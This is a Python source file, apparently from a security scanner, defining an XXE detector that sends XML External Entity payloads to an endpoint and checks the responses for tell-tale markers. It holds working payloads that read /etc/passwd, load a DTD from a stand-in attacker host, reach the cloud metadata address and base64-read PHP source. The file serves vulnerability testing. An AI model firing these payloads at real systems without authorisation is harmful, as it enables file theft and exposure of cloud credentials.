"""XXE Detector — tests for XML External Entity injection."""

from __future__ import annotations

from typing import Any

from sentinel_v2.executors.base import BaseExecutor


class XXEDetector(BaseExecutor):
    """Tests for XXE using DTD payloads."""

    # XXE payloads
    PAYLOADS = [
        # Basic XXE - read file
        {
            "name": "basic_file_read",
            "content_type": "application/xml",
            "body": '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
            "marker": "root:",
            "description": "Basic XXE file read",
        },
        # Parameter entity
        {
            "name": "parameter_entity",
            "content_type": "application/xml",
            "body": '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]><root>test</root>',
            "marker": "root:",
            "description": "Parameter entity XXE",
        },
        # Blind XXE with external DTD
        {
            "name": "blind_external_dtd",
            "content_type": "application/xml",
            "body": '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]><root>test</root>',
            "marker": None,  # Blind - no marker
            "description": "Blind XXE with external DTD",
        },
        # SSRF via XXE
        {
            "name": "ssrf_via_xxe",
            "content_type": "application/xml",
            "body": '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&xxe;</root>',
            "marker": "ami-",
            "description": "SSRF via XXE to cloud metadata",
        },
        # PHP filter
        {
            "name": "php_filter",
            "content_type": "application/xml",
            "body": '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]><root>&xxe;</root>',
            "marker": "PD9w",
            "description": "PHP filter XXE",
        },
    ]

    @property
    def name(self) -> str:
        return "xxe_detector"

    @property
    def vuln_class(self) -> str:
        return "xxe"

    @property
    def description(self) -> str:
        return "Tests for XML External Entity injection using DTD payloads"

    async def test(self, endpoint: str, **kwargs) -> dict[str, Any]:
        findings = []
        evidence = []
        http = kwargs.get("http_client")
        headers = kwargs.get("headers", {})

        if not http:
            return {"findings": [], "evidence": [], "error": "No HTTP client"}

        for payload_data in self.PAYLOADS:
            payload_headers = dict(headers)
            payload_headers["Content-Type"] = payload_data["content_type"]

            result = await http.request(
                "POST",
                endpoint,
                headers=payload_headers,
                body=payload_data["body"],
            )

            evidence.append({
                "payload_name": payload_data["name"],
                "status": result["status_code"],
                "length": len(result["body"]),
                "snippet": result["body"][:200],
            })

            # Check for marker in response
            marker = payload_data.get("marker")
            if marker and marker in result["body"]:
                findings.append(self._create_finding(
                    title=f"XXE — {payload_data['description']}",
                    severity="critical",
                    endpoint=endpoint,
                    evidence=f"Payload {payload_data['name']} resulted in marker '{marker}' in response. Status: {result['status_code']}",
                    steps=[
                        f"Send XML payload to {endpoint}",
                        f"Observe {marker} in response",
                        "Confirm XXE vulnerability",
                        "Read sensitive files or pivot to SSRF",
                    ],
                    impact="Arbitrary file read, SSRF, potential RCE",
                    confidence=0.9,
                ))
                break  # Found XXE, no need to test more

            # Check if XML is being parsed (error messages)
            error_indicators = ["xml", "entity", "dtd", "doctype", "parse"]
            if any(indicator in result["body"].lower() for indicator in error_indicators):
                evidence.append({
                    "observation": "XML parsing detected in error message",
                    "snippet": result["body"][:200],
                })

        # Test with different content types
        content_types = [
            "application/xml",
            "text/xml",
            "application/soap+xml",
            "application/rss+xml",
            "application/atom+xml",
        ]

        for ct in content_types[:2]:
            test_body = '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'
            test_headers = dict(headers)
            test_headers["Content-Type"] = ct

            result = await http.request("POST", endpoint, headers=test_headers, body=test_body)

            if "root:" in result["body"]:
                findings.append(self._create_finding(
                    title=f"XXE — accepts XML with Content-Type: {ct}",
                    severity="critical",
                    endpoint=endpoint,
                    evidence=f"XXE payload accepted with Content-Type: {ct}",
                    steps=[
                        f"Send XML with Content-Type: {ct}",
                        "Verify XXE payload is processed",
                        "Read sensitive files",
                    ],
                    impact="Arbitrary file read via XXE",
                    confidence=0.9,
                ))
                break

        return {
            "findings": [f.to_dict() for f in findings],
            "evidence": evidence,
            "tested_count": len(self.PAYLOADS) + 2,
            "vulnerable": len(findings) > 0,
        }
